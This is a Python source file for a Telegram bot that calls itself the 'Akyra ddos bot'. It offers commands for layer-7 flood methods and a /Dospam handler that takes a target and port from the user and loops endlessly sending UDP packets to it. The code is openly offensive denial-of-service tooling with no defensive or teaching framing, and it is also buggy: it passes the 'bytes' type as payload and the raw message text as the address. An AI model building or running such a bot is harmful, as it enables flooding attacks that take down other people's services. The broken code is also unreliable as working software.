# Импотируем модули
import DDos
import telebot
import settings as cfg
import time
import telebot
import socket
bot = telebot.TeleBot(cfg.token, parse_mode=None)
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


@bot.message_handler(commands=['start'])
def start (message):
    bot.reply_to(message, "Hi sir , type /help")

@bot.message_handler(commands=['help'])
def help (message):
    bot.send_message(message.chat.id, "welcome to Akyra ddos bot: \n /help - all command \n /author - author of bot\n /method- all method")
@bot.message_handler(commands=['method'])
def methodl7 (message):
  bot.send_message(message.chat.id, "Layer7 Method :\n /Tlsflood\n /httpbypass \n /httpflood \n /TlsfloodvV2 \n /Dospam")

@bot.message_handler(commands=['Dospam'])
def ddosa (message):
    msg = bot.send_message(message.chat.id, "target and port :")
    bot.register_next_step_handler(msg, ddoss)
def ddoss (message):
  target = message.text
  bot.send_message(message.chat.id, "attack started")
  while True:
    client.sendto(bytes, target)
   
@bot.message_handler(commands=['author'])
def author (message):
  bot.send_message(message.chat.id, "@vilgax and 0xSn1kky =)")
  
bot.polling(none_stop=True, interval=0)
